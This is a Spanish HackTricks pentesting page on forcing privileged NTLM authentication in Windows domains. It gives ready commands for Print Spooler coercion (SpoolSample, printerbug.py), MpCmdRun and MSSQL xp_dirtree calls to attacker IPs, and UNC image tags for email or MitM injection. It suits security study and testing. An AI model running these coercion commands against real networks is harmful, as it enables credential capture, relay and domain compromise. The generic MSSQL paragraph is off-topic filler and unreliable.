# Forzar la autenticación privilegiada NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.

## Abuso del servicio Spooler

Si el servicio _**Print Spooler**_ está **habilitado**, se pueden utilizar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del controlador de dominio una **actualización** sobre nuevos trabajos de impresión y simplemente decirle que **envíe la notificación a algún sistema**.\
Tenga en cuenta que cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **utilizará la cuenta de equipo** en esta autenticación.

### Encontrar servidores de Windows en el dominio

Usando PowerShell, obtenga una lista de equipos con Windows. Los servidores suelen tener prioridad, así que centrémonos en ellos:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando servicios Spooler escuchando

Utilizando una versión ligeramente modificada de SpoolerScanner de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifique si el servicio Spooler está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También se puede utilizar rpcdump.py en Linux y buscar el protocolo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar al servicio que se autentique contra un host arbitrario

Puedes compilar [**SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**dementor.py** de 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando con Delegación sin Restricciones

Si un atacante ya ha comprometido una computadora con [Delegación sin Restricciones](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación sin restricciones, el **TGT** de la **cuenta de computadora de la impresora** se guardará en la **memoria** de la computadora con delegación sin restricciones. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## Autenticación Forzada de RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

El ataque `PrivExchange` resulta de una falla en la característica de `PushSubscription` del servidor Exchange, lo que permite que **cualquier usuario de dominio con una bandeja de entrada fuerce al servidor Exchange a autenticarse** en cualquier host proporcionado por el cliente a través de HTTP.

El servicio de Exchange se ejecuta como **SYSTEM** y tiene **privilegios excesivos** por defecto (es decir, tiene privilegios de WriteDacl en el dominio antes de la actualización acumulativa de 2019). Esta falla se puede aprovechar para **relé a LDAP y volcar la base de datos NTDS del dominio**. Si no podemos relé a LDAP, esto se puede aprovechar para relé y autenticar en **otros hosts** dentro del dominio. Este ataque lo llevará directamente a Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.

****[**Esta técnica fue copiada de aquí.**](https://academy.hackthebox.com/module/143/section/1276)****

## Dentro de Windows

Si ya está dentro de la máquina Windows, puede forzar a Windows a conectarse a un servidor usando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL es un sistema de gestión de bases de datos relacionales desarrollado por Microsoft. Es utilizado por muchas organizaciones para almacenar y gestionar grandes cantidades de datos. Los atacantes pueden aprovechar las vulnerabilidades en MSSQL para obtener acceso no autorizado a la base de datos y robar información confidencial. Algunas técnicas comunes de ataque incluyen la inyección de SQL y la explotación de vulnerabilidades conocidas en el software. Es importante asegurarse de que MSSQL esté configurado de manera segura y de aplicar parches de seguridad regularmente para evitar posibles ataques.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

## Inyección de HTML

### A través de correo electrónico

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que deseas comprometer, simplemente puedes enviarle un **correo electrónico con una imagen de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una página que visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Crackeando NTLMv1

Si puedes capturar [desafíos NTLMv1 lee aquí cómo crackearlos](../ntlm/#ntlmv1-attack).\
_Recuerda que para crackear NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_ 

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
